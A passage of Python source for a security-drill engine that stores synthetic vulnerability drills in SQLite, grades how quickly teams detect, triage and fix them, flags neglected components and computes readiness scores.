                    scenario_id         TEXT PRIMARY KEY,
                    name                TEXT NOT NULL,
                    description         TEXT NOT NULL,
                    severity            TEXT NOT NULL,
                    cve_id              TEXT,
                    cvss_score          REAL NOT NULL DEFAULT 0.0,
                    cwe_ids             TEXT NOT NULL DEFAULT '[]',
                    mitre_techniques    TEXT NOT NULL DEFAULT '[]',
                    mitre_tactics       TEXT NOT NULL DEFAULT '[]',
                    synthetic_finding   TEXT NOT NULL DEFAULT '{}',
                    expected_detection_minutes INTEGER NOT NULL DEFAULT 60,
                    expected_triage_classification TEXT NOT NULL,
                    expected_remediation_approach TEXT NOT NULL DEFAULT '',
                    is_custom           INTEGER NOT NULL DEFAULT 0,
                    created_at          TEXT NOT NULL,
                    tags                TEXT NOT NULL DEFAULT '[]'
                );

                CREATE TABLE IF NOT EXISTS fail_activity_log (
                    activity_id         TEXT PRIMARY KEY,
                    org_id              TEXT NOT NULL,
                    component           TEXT NOT NULL,
                    activity_type       TEXT NOT NULL,
                    description         TEXT NOT NULL DEFAULT '',
                    actor               TEXT,
                    has_critical_data   INTEGER NOT NULL DEFAULT 0,
                    occurred_at         TEXT NOT NULL
                );

                CREATE INDEX IF NOT EXISTS idx_activity_org_component
                    ON fail_activity_log(org_id, component);
                CREATE INDEX IF NOT EXISTS idx_activity_occurred
                    ON fail_activity_log(occurred_at);

                CREATE TABLE IF NOT EXISTS fail_training_samples (
                    sample_id           TEXT PRIMARY KEY,
                    drill_id            TEXT NOT NULL,
                    org_id              TEXT NOT NULL,
                    scenario_id         TEXT NOT NULL,
                    severity            TEXT NOT NULL,
                    detected            INTEGER NOT NULL DEFAULT 0,
                    detection_minutes   INTEGER,
                    detection_label     TEXT NOT NULL DEFAULT 'missed',
                    triage_correct      INTEGER NOT NULL DEFAULT 0,
                    triage_expected     TEXT,
                    triage_actual       TEXT,
                    triage_label        TEXT NOT NULL DEFAULT 'incorrect',
                    features_json       TEXT NOT NULL DEFAULT '{}',
                    created_at          TEXT NOT NULL,
                    FOREIGN KEY (drill_id) REFERENCES fail_drills(drill_id)
                );

                CREATE INDEX IF NOT EXISTS idx_training_org
                    ON fail_training_samples(org_id);
                CREATE INDEX IF NOT EXISTS idx_training_scenario
                    ON fail_training_samples(scenario_id);
            """)

    # ------------------------------------------------------------------
    # Drill CRUD
    # ------------------------------------------------------------------

    def save_drill(self, drill: Drill) -> None:
        with self._conn() as conn:
            conn.execute(
                """
                INSERT OR REPLACE INTO fail_drills (
                    drill_id, scenario_id, scenario_name, target_component, org_id,
                    status, severity, synthetic_finding_id, synthetic_finding,
                    detected_by, triaged_by, remediated_by, triage_classification,
                    escalated, notified_teams, score_json, timeline_json,
                    created_at, expires_at, notes
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    drill.drill_id,
                    drill.scenario_id,
                    drill.scenario_name,
                    drill.target_component,
                    drill.org_id,
                    drill.status.value,
                    drill.severity.value,
                    drill.synthetic_finding_id,
                    json.dumps(drill.synthetic_finding),
                    drill.detected_by,
                    drill.triaged_by,
                    drill.remediated_by,
                    drill.triage_classification.value if drill.triage_classification else None,
                    int(drill.escalated),
                    json.dumps(drill.notified_teams),
                    json.dumps(drill.score.to_dict()) if drill.score else None,
                    json.dumps(drill.timeline.to_dict()),
                    drill.created_at,
                    drill.expires_at,
                    drill.notes,
                ),
            )

    def get_drill(self, drill_id: str) -> Optional[Dict[str, Any]]:
        with self._conn() as conn:
            row = conn.execute(
                "SELECT * FROM fail_drills WHERE drill_id = ?", (drill_id,)
            ).fetchone()
        if row is None:
            return None
        return self._drill_row_to_dict(row)

    def get_active_drills(self, org_id: str) -> List[Dict[str, Any]]:
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT * FROM fail_drills
                WHERE org_id = ? AND status NOT IN ('graded', 'cancelled', 'expired')
                ORDER BY created_at DESC
                """,
                (org_id,),
            ).fetchall()
        return [self._drill_row_to_dict(r) for r in rows]

    def get_drill_history(self, org_id: str, days: int = 90) -> List[Dict[str, Any]]:
        cutoff = (_utcnow() - timedelta(days=days)).isoformat()
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT * FROM fail_drills
                WHERE org_id = ? AND created_at >= ?
                ORDER BY created_at DESC
                """,
                (org_id, cutoff),
            ).fetchall()
        return [self._drill_row_to_dict(r) for r in rows]

    def get_graded_drills(self, org_id: str, limit: int = 10) -> List[Dict[str, Any]]:
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT * FROM fail_drills
                WHERE org_id = ? AND status = 'graded' AND score_json IS NOT NULL
                ORDER BY created_at DESC
                LIMIT ?
                """,
                (org_id, limit),
            ).fetchall()
        return [self._drill_row_to_dict(r) for r in rows]

    def _drill_row_to_dict(self, row: sqlite3.Row) -> Dict[str, Any]:
        d = dict(row)
        d["synthetic_finding"] = json.loads(d.get("synthetic_finding") or "{}")
        d["notified_teams"] = json.loads(d.get("notified_teams") or "[]")
        d["score"] = json.loads(d["score_json"]) if d.get("score_json") else None
        d["timeline"] = json.loads(d.get("timeline_json") or "{}")
        d.pop("score_json", None)
        d.pop("timeline_json", None)
        return d

    # ------------------------------------------------------------------
    # Scenario CRUD
    # ------------------------------------------------------------------

    def upsert_scenario(self, scenario: VulnerabilityScenario) -> None:
        with self._conn() as conn:
            conn.execute(
                """
                INSERT OR REPLACE INTO fail_scenarios (
                    scenario_id, name, description, severity, cve_id, cvss_score,
                    cwe_ids, mitre_techniques, mitre_tactics, synthetic_finding,
                    expected_detection_minutes, expected_triage_classification,
                    expected_remediation_approach, is_custom, created_at, tags
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    scenario.scenario_id,
                    scenario.name,
                    scenario.description,
                    scenario.severity.value,
                    scenario.cve_id,
                    scenario.cvss_score,
                    json.dumps(scenario.cwe_ids),
                    json.dumps(scenario.mitre_techniques),
                    json.dumps(scenario.mitre_tactics),
                    json.dumps(scenario.synthetic_finding),
                    scenario.expected_detection_minutes,
                    scenario.expected_triage_classification.value,
                    scenario.expected_remediation_approach,
                    int(scenario.is_custom),
                    scenario.created_at,
                    json.dumps(scenario.tags),
                ),
            )

    def get_all_scenarios(self) -> List[Dict[str, Any]]:
        with self._conn() as conn:
            rows = conn.execute(
                "SELECT * FROM fail_scenarios ORDER BY is_custom ASC, name ASC"
            ).fetchall()
        return [self._scenario_row_to_dict(r) for r in rows]

    def get_scenario(self, scenario_id: str) -> Optional[Dict[str, Any]]:
        with self._conn() as conn:
            row = conn.execute(
                "SELECT * FROM fail_scenarios WHERE scenario_id = ?", (scenario_id,)
            ).fetchone()
        return self._scenario_row_to_dict(row) if row else None

    def _scenario_row_to_dict(self, row: sqlite3.Row) -> Dict[str, Any]:
        d = dict(row)
        for field_name in ("cwe_ids", "mitre_techniques", "mitre_tactics", "synthetic_finding", "tags"):
            d[field_name] = json.loads(d.get(field_name) or "[]" if field_name != "synthetic_finding" else "{}")
        return d

    # ------------------------------------------------------------------
    # Activity log
    # ------------------------------------------------------------------

    def log_activity(
        self,
        org_id: str,
        component: str,
        activity_type: str,
        description: str = "",
        actor: Optional[str] = None,
        has_critical_data: bool = False,
        occurred_at: Optional[str] = None,
    ) -> str:
        activity_id = f"ACT-{uuid.uuid4().hex[:12].upper()}"
        ts = occurred_at or _utcnow_iso()
        with self._conn() as conn:
            conn.execute(
                """
                INSERT INTO fail_activity_log
                    (activity_id, org_id, component, activity_type, description,
                     actor, has_critical_data, occurred_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (activity_id, org_id, component, activity_type, description,
                 actor, int(has_critical_data), ts),
            )
        return activity_id

    def get_component_last_activity(
        self, org_id: str, component: str
    ) -> Optional[Dict[str, Any]]:
        with self._conn() as conn:
            row = conn.execute(
                """
                SELECT * FROM fail_activity_log
                WHERE org_id = ? AND component = ?
                ORDER BY occurred_at DESC
                LIMIT 1
                """,
                (org_id, component),
            ).fetchone()
        return dict(row) if row else None

    def get_components_with_activity(
        self, org_id: str, since: str
    ) -> List[Dict[str, Any]]:
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT component,
                       MAX(occurred_at) AS last_activity_at,
                       GROUP_CONCAT(DISTINCT activity_type) AS activity_types,
                       MAX(has_critical_data) AS has_critical_data
                FROM fail_activity_log
                WHERE org_id = ? AND occurred_at >= ?
                GROUP BY component
                """,
                (org_id, since),
            ).fetchall()
        return [dict(r) for r in rows]

    def get_all_known_components(self, org_id: str) -> List[str]:
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT DISTINCT target_component FROM fail_drills WHERE org_id = ?
                UNION
                SELECT DISTINCT component FROM fail_activity_log WHERE org_id = ?
                """,
                (org_id, org_id),
            ).fetchall()
        return [r[0] for r in rows]

    # ------------------------------------------------------------------
    # Training samples
    # ------------------------------------------------------------------

    def save_training_sample(self, sample: TrainingSample) -> None:
        with self._conn() as conn:
            conn.execute(
                """
                INSERT OR REPLACE INTO fail_training_samples (
                    sample_id, drill_id, org_id, scenario_id, severity,
                    detected, detection_minutes, detection_label,
                    triage_correct, triage_expected, triage_actual, triage_label,
                    features_json, created_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    sample.sample_id,
                    sample.drill_id,
                    sample.org_id,
                    sample.scenario_id,
                    sample.severity,
                    int(sample.detected),
                    sample.detection_minutes,
                    sample.detection_label,
                    int(sample.triage_correct),
                    sample.triage_expected,
                    sample.triage_actual,
                    sample.triage_label,
                    json.dumps(sample.features),
                    sample.created_at,
                ),
            )

    def get_training_data(
        self,
        org_id: Optional[str] = None,
        scenario_id: Optional[str] = None,
        limit: int = 1000,
    ) -> List[Dict[str, Any]]:
        query = "SELECT * FROM fail_training_samples WHERE 1=1"
        params: List[Any] = []
        if org_id:
            query += " AND org_id = ?"
            params.append(org_id)
        if scenario_id:
            query += " AND scenario_id = ?"
            params.append(scenario_id)
        query += " ORDER BY created_at DESC LIMIT ?"
        params.append(limit)
        with self._conn() as conn:
            rows = conn.execute(query, params).fetchall()
        result = []
        for r in rows:
            d = dict(r)
            d["features"] = json.loads(d.get("features_json") or "{}")
            d.pop("features_json", None)
            result.append(d)
        return result


# ---------------------------------------------------------------------------
# Scoring Engine
# ---------------------------------------------------------------------------


class DrillScorer:
    """
    Computes 4-dimension scores for completed drills.

    Dimensions:
      1. Detection Speed (0-10)  — how fast was the synthetic finding noticed?
      2. Triage Accuracy (0-10)  — was it correctly classified?
      3. Remediation Speed (0-10) — how fast was a fix applied?
      4. Communication (0-10)   — was the right team notified + escalation followed?

    Overall = weighted average: 0.30, 0.25, 0.30, 0.15
    """

    def score(
        self,
        drill: Drill,
        scenario: VulnerabilityScenario,
        detection_minutes: Optional[int] = None,
        triage_classification: Optional[TriageClassification] = None,
        remediation_minutes: Optional[int] = None,
        escalated: bool = False,
        team_notified: bool = False,
        notified_teams: Optional[List[str]] = None,
    ) -> DrillScore:
        """Compute all four dimension scores and overall."""

        ds = self._score_detection_speed(
            detection_minutes, scenario.expected_detection_minutes
        )
        ta = self._score_triage_accuracy(
            triage_classification, scenario.expected_triage_classification
        )
        rs = self._score_remediation_speed(
            remediation_minutes, detection_minutes
        )
        comm = self._score_communication(
            escalated, team_notified, notified_teams or [], scenario.severity
        )

        overall = (
            ds * SCORE_WEIGHTS["detection_speed"]
            + ta * SCORE_WEIGHTS["triage_accuracy"]
            + rs * SCORE_WEIGHTS["remediation_speed"]
            + comm * SCORE_WEIGHTS["communication"]
        )
        overall = round(max(0.0, min(10.0, overall)), 2)

        grade = self._overall_to_grade(overall)
        feedback = self._generate_feedback(
            ds, ta, rs, comm, detection_minutes, scenario
        )

        return DrillScore(
            drill_id=drill.drill_id,
            detection_speed=round(ds, 2),
            triage_accuracy=round(ta, 2),
            remediation_speed=round(rs, 2),
            communication=round(comm, 2),
            overall=overall,
            detection_minutes_actual=detection_minutes,
            detection_minutes_target=scenario.expected_detection_minutes,
            triage_classification_actual=triage_classification.value if triage_classification else None,
            triage_classification_expected=scenario.expected_triage_classification.value,
            remediation_minutes_actual=remediation_minutes,
            escalated_correctly=escalated,
            team_notified=team_notified,
            grade=grade,
            feedback=feedback,
        )

    # ------------------------------------------------------------------
    # Dimension scorers
    # ------------------------------------------------------------------

    def _score_detection_speed(
        self,
        actual_minutes: Optional[int],
        target_minutes: int,
    ) -> float:
        """Score detection speed: 10.0 = instant, 0.0 = missed/very late."""
        if actual_minutes is None:
            return 0.0  # Not detected at all
        if actual_minutes <= 0:
            return 10.0
        # Exponential decay based on target
        ratio = actual_minutes / max(1, target_minutes)
        if ratio <= 0.25:
            return 10.0
        elif ratio <= 0.5:
            return 9.0
        elif ratio <= 1.0:
            return 8.0 - (ratio - 0.5) * 4.0      # 8.0 → 6.0 as ratio 0.5→1.0
        elif ratio <= 2.0:
            return 6.0 - (ratio - 1.0) * 3.0      # 6.0 → 3.0 as ratio 1.0→2.0
        elif ratio <= 5.0:
            return 3.0 - (ratio - 2.0) * 0.8      # 3.0 → 0.6 as ratio 2.0→5.0
        else:
            return max(0.0, 0.6 - (ratio - 5.0) * 0.1)

    def _score_triage_accuracy(
        self,
        actual: Optional[TriageClassification],
        expected: TriageClassification,
    ) -> float:
        """Score triage accuracy based on how close the classification is."""
        if actual is None:
            return 0.0

        # Exact match
        if actual == expected:
            return 10.0

        # Special cases
        if actual == TriageClassification.SYNTHETIC:
            # Team identified it as a drill — still gets partial credit
            return 5.0

        if actual == TriageClassification.FALSE_POSITIVE:
            # Incorrectly dismissed
            return 1.0

        # Severity mismatch scoring
        severity_order = {
            TriageClassification.REAL_CRITICAL: 4,
            TriageClassification.REAL_HIGH: 3,
            TriageClassification.REAL_MEDIUM: 2,
            TriageClassification.REAL_LOW: 1,
            TriageClassification.FALSE_POSITIVE: 0,
            TriageClassification.SYNTHETIC: -1,
            TriageClassification.WONT_FIX: -2,
        }
        exp_val = severity_order.get(expected, 2)
        act_val = severity_order.get(actual, 2)
        diff = abs(exp_val - act_val)
        if diff == 0:
            return 10.0
        elif diff == 1:
            return 7.0
        elif diff == 2:
            return 4.0
        elif diff == 3:
            return 2.0
        else:
            return 0.5

    def _score_remediation_speed(
        self,
        remediation_minutes: Optional[int],
        detection_minutes: Optional[int],
    ) -> float:
        """Score remediation speed relative to SLA."""
        if detection_minutes is None:
            return 0.0  # Can't remediate what wasn't detected
        if remediation_minutes is None:
            return 0.0  # Not remediated

        ratio = remediation_minutes / max(1, REMEDIATION_SLA_MINUTES)
        if ratio <= 0.25:
            return 10.0
        elif ratio <= 0.5:
            return 9.0
        elif ratio <= 1.0:
            score = 9.0 - (ratio - 0.5) * 6.0    # 9→6 as ratio 0.5→1
            return max(6.0, score)
        elif ratio <= 2.0:
            return 6.0 - (ratio - 1.0) * 3.0
        elif ratio <= 4.0:
            return max(1.0, 3.0 - (ratio - 2.0) * 1.0)
        else:
            return max(0.0, 1.0 - (ratio - 4.0) * 0.1)

    def _score_communication(
        self,
        escalated: bool,
        team_notified: bool,
        notified_teams: List[str],
        severity: Severity,
    ) -> float:
        """Score communication quality."""
        score = 0.0

        # Team notification
        if team_notified or notified_teams:
            score += 4.0

        # Escalation for critical/high
        if severity in (Severity.CRITICAL, Severity.HIGH):
            if escalated:
                score += 4.0
            # Multiple teams notified
            if len(notified_teams) >= 2:
                score += 2.0
        else:
            # For medium/low, notification alone is fine
            if escalated or len(notified_teams) >= 2:
                score += 3.0
            score = min(10.0, score + 3.0)

        return min(10.0, score)

    def _overall_to_grade(self, score: float) -> str:
        if score >= 9.0:
            return "A+"
        elif score >= 8.0:
            return "A"
        elif score >= 7.0:
            return "B"
        elif score >= 6.0:
            return "C"
        elif score >= 5.0:
            return "D"
        else:
            return "F"

    def _generate_feedback(
        self,
        detection_speed: float,
        triage_accuracy: float,
        remediation_speed: float,
        communication: float,
        detection_minutes: Optional[int],
        scenario: VulnerabilityScenario,
    ) -> List[str]:
        """Generate human-readable feedback for each dimension."""
        feedback = []

        if detection_speed < 5.0:
            if detection_minutes is None:
                feedback.append(
                    f"DETECTION MISS: The synthetic {scenario.name} finding was never detected. "
                    "Review alerting and monitoring coverage for this component."
                )
            else:
                feedback.append(
                    f"SLOW DETECTION: {detection_minutes} min actual vs "
                    f"{scenario.expected_detection_minutes} min target. "
                    "Consider automated detection rules for this scenario type."
                )
        elif detection_speed >= 8.0:
            feedback.append(f"FAST DETECTION: Excellent — {detection_minutes} min response time.")

        if triage_accuracy < 5.0:
            feedback.append(
                f"TRIAGE MISS: The finding was mis-classified. Expected "
                f"'{scenario.expected_triage_classification.value}'. "
                "Improve triage runbook for this vulnerability class."
            )
        elif triage_accuracy >= 8.0:
            feedback.append("TRIAGE ACCURATE: Correct severity classification.")

        if remediation_speed < 5.0:
            feedback.append(
                "SLOW REMEDIATION: Fix took longer than the 8-hour SLA target. "
                f"Recommended approach: {scenario.expected_remediation_approach[:120]}..."
            )

        if communication < 5.0:
            feedback.append(
                "COMMUNICATION GAP: Escalation or team notification was incomplete. "
                "Verify incident escalation matrix is followed for this severity."
            )

        return feedback


# ---------------------------------------------------------------------------
# Neglect Zone Detector
# ---------------------------------------------------------------------------


class NeglectZoneDetector:
    """
    Identifies components with no recent security activity.
    Components with no activity in 90+ days are flagged as neglect zones.
    """

    def __init__(self, db: DrillDB) -> None:
        self._db = db

    def detect(
        self, org_id: str, threshold_days: int = NEGLECT_THRESHOLD_DAYS
    ) -> List[NeglectZone]:
        """Detect all neglect zones for an organisation."""
        cutoff = (_utcnow() - timedelta(days=threshold_days)).isoformat()
        active_components = {
            r["component"]: r
            for r in self._db.get_components_with_activity(org_id, cutoff)
        }
        all_components = self._db.get_all_known_components(org_id)

        neglect_zones: List[NeglectZone] = []
        for component in all_components:
            if component in active_components:
                continue

            # Find last activity ever for this component
            last = self._db.get_component_last_activity(org_id, component)
            last_at: Optional[str] = last["occurred_at"] if last else None
            has_critical = bool(last.get("has_critical_data", 0)) if last else False

            if last_at:
                last_dt = datetime.fromisoformat(last_at)
                if last_dt.tzinfo is None:
                    last_dt = last_dt.replace(tzinfo=timezone.utc)
                days_since = (_utcnow() - last_dt).days
            else:
                days_since = 999

            risk = self._calculate_risk(days_since, has_critical)
            suggested = self._suggest_drill(component, days_since)

            reason = (
                f"No security activity in {days_since} days "
                f"(threshold: {threshold_days} days)."
            )
            if has_critical:
                reason += " Component holds critical data — elevated risk."

            neglect_zones.append(NeglectZone(
                component=component,
                org_id=org_id,
                last_activity_at=last_at,
                days_since_activity=days_since,
                activity_types_missing=["scan", "review", "drill"],
                risk_level=risk,
                has_critical_data=has_critical,
                suggested_drill_scenario=suggested,
                reason=reason,
            ))

        neglect_zones.sort(key=lambda z: (z.risk_level == "urgent", z.has_critical_data,
                                           z.days_since_activity), reverse=True)
        return neglect_zones

    def _calculate_risk(self, days_since: int, has_critical_data: bool) -> str:
        if has_critical_data and days_since >= threshold_days_for_urgent():
            return "urgent"
        if days_since >= 180:
            return "high"
        elif days_since >= 120:
            return "medium"
        else:
            return "low"

    def _suggest_drill(self, component: str, days_since: int) -> str:
        """Suggest a relevant drill based on component name heuristics."""
        name = component.lower()
        if any(x in name for x in ("auth", "login", "sso", "oauth", "jwt")):
            return "broken_auth"
        if any(x in name for x in ("db", "database", "sql", "data", "repo")):
            return "sqli"
        if any(x in name for x in ("api", "gateway", "proxy", "fetch")):
            return "ssrf"
        if any(x in name for x in ("file", "storage", "upload", "s3")):
            return "path_traversal"
        if any(x in name for x in ("log", "logger", "monitor", "trace")):
            return "log4shell"
        if any(x in name for x in ("secret", "config", "env", "key")):
            return "hardcoded_credentials"
        if any(x in name for x in ("web", "ui", "frontend", "html")):
            return "xss"
        if any(x in name for x in ("crypto", "encrypt", "hash", "sign")):
            return "crypto_weakness"
        if any(x in name for x in ("dep", "package", "pip", "npm", "lib")):
            return "supply_chain"
        # Default for old components: suggest the high-impact one
        return "log4shell" if days_since >= 180 else "hardcoded_credentials"


def threshold_days_for_urgent() -> int:
    """Return the threshold for urgent risk level."""
    return NEGLECT_THRESHOLD_DAYS


# ---------------------------------------------------------------------------
# Readiness Calculator
# ---------------------------------------------------------------------------


class ReadinessCalculator:
    """
    Calculates organisation readiness scores from drill history.

    Readiness = rolling average of last N drill scores (default: last 10).
    Trend is computed from the last 5 vs previous 5 drills.
    """

    def __init__(self, db: DrillDB, benchmark: float = INDUSTRY_BENCHMARK_DEFAULT) -> None:
        self._db = db
        self._benchmark = benchmark

    def calculate(self, org_id: str) -> ReadinessScore:
        graded = self._db.get_graded_drills(org_id, limit=READINESS_DRILL_WINDOW * 2)
        if not graded:
            return ReadinessScore(
                org_id=org_id,
                overall_score=0.0,
                drill_count=0,
                last_drill_at=None,
                trend=ReadinessTrend.INSUFFICIENT_DATA,
                team_scores={},
                dimension_averages={},
                industry_benchmark=self._benchmark,
                benchmark_delta=0.0 - self._benchmark,
                percentile=0,
                graded_drills=[],
            )

        scores = [d["score"] for d in graded if d.get("score")]
        overall_scores = [s["overall"] for s in scores if s]
        window = overall_scores[:READINESS_DRILL_WINDOW]
        overall = round(sum(window) / len(window), 2) if window else 0.0

        trend = self._compute_trend(overall_scores)
        team_scores = self._compute_team_scores(graded)
        dim_averages = self._compute_dimension_averages(scores)
        delta = round(overall - self._benchmark, 2)
        percentile = self._estimate_percentile(overall)

        return ReadinessScore(
            org_id=org_id,
            overall_score=overall,
            drill_count=len(graded),
            last_drill_at=graded[0].get("created_at") if graded else None,
            trend=trend,
            team_scores=team_scores,
            dimension_averages=dim_averages,
            industry_benchmark=self._benchmark,
            benchmark_delta=delta,
            percentile=percentile,
            graded_drills=[
                {"drill_id": d["drill_id"], "scenario_id": d["scenario_id"],
                 "overall": d["score"].get("overall") if d.get("score") else None,
                 "created_at": d["created_at"]}
                for d in graded[:READINESS_DRILL_WINDOW]
            ],
        )

    def _compute_trend(self, scores: List[float]) -> ReadinessTrend:
        if len(scores) < 4:
            return ReadinessTrend.INSUFFICIENT_DATA
        recent = scores[:min(5, len(scores) // 2)]
        older = scores[min(5, len(scores) // 2):]
        if not recent or not older:
            return ReadinessTrend.INSUFFICIENT_DATA
        avg_recent = sum(recent) / len(recent)
        avg_older = sum(older) / len(older)
        delta = avg_recent - avg_older
        if delta > 0.5:
            return ReadinessTrend.IMPROVING
        elif delta < -0.5:
            return ReadinessTrend.DECLINING
        else:
            return ReadinessTrend.STABLE

    def _compute_team_scores(self, drills: List[Dict[str, Any]]) -> Dict[str, float]:
        """Group scores by remediated_by / detected_by fields as a proxy for team."""
        team_map: Dict[str, List[float]] = {}
        for d in drills:
            if not d.get("score"):
                continue
            actors = [d.get("detected_by"), d.get("triaged_by"), d.get("remediated_by")]
            teams = {a.split("@")[0] if a and "@" in a else a for a in actors if a}
            for team in teams:
                if team:
                    team_map.setdefault(team, []).append(d["score"]["overall"])
        return {
            team: round(sum(scores) / len(scores), 2)
            for team, scores in team_map.items()
        }

    def _compute_dimension_averages(self, scores: List[Dict[str, Any]]) -> Dict[str, float]:
        dims = ["detection_speed", "triage_accuracy", "remediation_speed", "communication"]
        result: Dict[str, float] = {}
        for dim in dims:
            vals = [s[dim] for s in scores if s and dim in s]
            result[dim] = round(sum(vals) / len(vals), 2) if vals else 0.0
        return result

    def _estimate_percentile(self, score: float) -> int:
        """Estimate percentile relative to industry benchmark distribution."""
        # Assume normal distribution centred on benchmark with std dev 1.5
        import math
        mu = self._benchmark
        sigma = 1.5
        z = (score - mu) / sigma
        # Approximate CDF
        percentile = 50 * (1 + math.erf(z / math.sqrt(2)))
        return max(1, min(99, int(percentile)))


# ---------------------------------------------------------------------------
# Training Data Generator
# ---------------------------------------------------------------------------


class TrainingDataGenerator:
    """
    Generates labeled ML training samples from completed drills.

    Every graded drill contributes two types of samples:
    1. Detection signal: was the finding detected and how fast?
    2. Triage signal: was the classification correct?
    """

    def generate(self, drill: Drill, scenario: VulnerabilityScenario) -> TrainingSample:
        detection_minutes = self._compute_detection_minutes(drill)
        detected = detection_minutes is not None

        detection_label = self._detection_label(
            detection_minutes, scenario.expected_detection_minutes
        )

        triage_actual = drill.triage_classification
        triage_expected = scenario.expected_triage_classification
        triage_correct = (triage_actual == triage_expected)
        triage_label = (
            "correct" if triage_correct
            else "skipped" if triage_actual is None
            else "incorrect"
        )

        features = {
            "scenario_id": scenario.scenario_id,
            "severity": scenario.severity.value,
            "cvss_score": scenario.cvss_score,
            "cwe_count": len(scenario.cwe_ids),
            "mitre_technique_count": len(scenario.mitre_techniques),
            "target_component": drill.target_component,
            "detection_minutes": detection_minutes,
            "detection_target_minutes": scenario.expected_detection_minutes,
            "escalated": drill.escalated,
            "team_count_notified": len(drill.notified_teams),
            "overall_score": drill.score.overall if drill.score else None,
        }

        return TrainingSample(
            sample_id=f"TRN-{uuid.uuid4().hex[:12].upper()}",
            drill_id=drill.drill_id,
            org_id=drill.org_id,
            scenario_id=scenario.scenario_id,
            severity=scenario.severity.value,
            detected=detected,
            detection_minutes=detection_minutes,
            detection_label=detection_label,
            triage_correct=triage_correct,
            triage_expected=triage_expected.value if triage_expected else None,
            triage_actual=triage_actual.value if triage_actual else None,
            triage_label=triage_label,
            features=features,
        )

    def _compute_detection_minutes(self, drill: Drill) -> Optional[int]:
        tl = drill.timeline
        if not tl.injected_at or not tl.detected_at:
            return None
        try:
            injected = datetime.fromisoformat(tl.injected_at)
            detected = datetime.fromisoformat(tl.detected_at)
            if injected.tzinfo is None:
                injected = injected.replace(tzinfo=timezone.utc)
            if detected.tzinfo is None:
                detected = detected.replace(tzinfo=timezone.utc)
            delta = (detected - injected).total_seconds() / 60
            return max(0, int(delta))
        except (ValueError, TypeError):
            return None

    def _detection_label(
        self, actual_minutes: Optional[int], target_minutes: int
    ) -> str:
        if actual_minutes is None:
            return "missed"
        ratio = actual_minutes / max(1, target_minutes)
        if ratio <= 1.0:
            return "fast"
        elif ratio <= 3.0:
            return "slow"
        else:
            return "very_slow"


# ---------------------------------------------------------------------------
# Main DrillEngine
# ---------------------------------------------------------------------------


class DrillEngine:
    """
    The FAIL Engine — Fault & Attack Injection Layer (suite-attack edition).

    This is the primary interface for the chaos engineering system.
    Inject synthetic vulnerabilities, track team response, grade performance,
    detect neglect zones, and compute readiness scores.
    """

    VERSION = ENGINE_VERSION

    def __init__(
        self,
        db_path: Optional[Path] = None,
        industry_benchmark: float = INDUSTRY_BENCHMARK_DEFAULT,
    ) -> None:
        self._db = DrillDB(db_path)
        self._scorer = DrillScorer()
        self._neglect_detector = NeglectZoneDetector(self._db)
        self._readiness_calc = ReadinessCalculator(self._db, industry_benchmark)
        self._training_gen = TrainingDataGenerator()
        self._scenarios: Dict[str, VulnerabilityScenario] = _build_scenario_library()
        self._seed_scenarios()

    def _seed_scenarios(self) -> None:
        """Persist built-in scenarios to DB (idempotent)."""
        for scenario in self._scenarios.values():
            try:
                self._db.upsert_scenario(scenario)
            except (OSError, ValueError, KeyError, RuntimeError) as exc:  # narrowed from bare Exception
                logger.warning("Failed to seed scenario %s: %s", scenario.scenario_id, exc)

    # ------------------------------------------------------------------
    # Drill lifecycle
    # ------------------------------------------------------------------

    def create_drill(
        self,
        scenario: str,
        target_component: str,
        org_id: str,
        notes: str = "",
        injected_by: Optional[str] = None,
    ) -> Drill:
        """
        Inject a synthetic vulnerability finding for the given scenario
        into the named component for the given organisation.

        Returns the created Drill with status=ACTIVE.
        """
        sc = self._get_scenario_or_raise(scenario)

        drill_id = f"DRILL-{uuid.uuid4().hex[:12].upper()}"
        now = _utcnow_iso()

        # Build the synthetic finding with drill metadata embedded
        finding = dict(sc.synthetic_finding)
        finding["drill_id"] = drill_id
        finding["injected_at"] = now
        finding["target_component"] = target_component
        finding["org_id"] = org_id

        timeline = DrillTimeline(drill_id=drill_id)
        timeline.injected_at = now
        timeline.add_event(
            "injected",
            f"Synthetic {sc.name} finding injected into {target_component}",
            actor=injected_by or "fail-engine",
        )

        drill = Drill(
            drill_id=drill_id,
            scenario_id=sc.scenario_id,
            scenario_name=sc.name,
            target_component=target_component,
            org_id=org_id,
            status=DrillStatus.ACTIVE,
            severity=sc.severity,
            synthetic_finding=finding,
            timeline=timeline,
            created_at=now,
            notes=notes,
        )

        self._db.save_drill(drill)

        # Log the drill as security activity for the component
        self._db.log_activity(
            org_id=org_id,
            component=target_component,
            activity_type="drill",
            description=f"FAIL drill injected: {sc.name}",
            actor=injected_by or "fail-engine",
        )

        logger.info(
            "FAIL drill created: %s scenario=%s component=%s org=%s",
            drill_id, scenario, target_component, org_id,
        )
        return drill

    def get_active_drills(self, org_id: str) -> List[Dict[str, Any]]:
        """Return all active (non-graded, non-cancelled) drills for an org."""
        return self._db.get_active_drills(org_id)

    def get_drill(self, drill_id: str) -> Optional[Dict[str, Any]]:
        """Return a single drill by ID with full timeline and score."""
        return self._db.get_drill(drill_id)

    def mark_detected(
        self,
        drill_id: str,
        detected_by: Optional[str] = None,
        detection_note: str = "",
    ) -> Dict[str, Any]:
        """Signal that the synthetic finding was detected."""
        raw = self._db.get_drill(drill_id)
        if not raw:
            raise ValueError(f"Drill {drill_id} not found")

        drill = self._dict_to_drill(raw)
        if drill.status not in (DrillStatus.ACTIVE, DrillStatus.PENDING):
            raise ValueError(f"Drill {drill_id} is not active (status={drill.status.value})")

        now = _utcnow_iso()
        drill.status = DrillStatus.DETECTED
        drill.detected_by = detected_by
        drill.timeline.detected_at = now
        drill.timeline.add_event(
            "detected",
            f"Synthetic finding detected. {detection_note}".strip(),
            actor=detected_by,
        )
        self._db.save_drill(drill)
        return drill.to_dict()

    def mark_triaged(
        self,
        drill_id: str,
        classification: str,
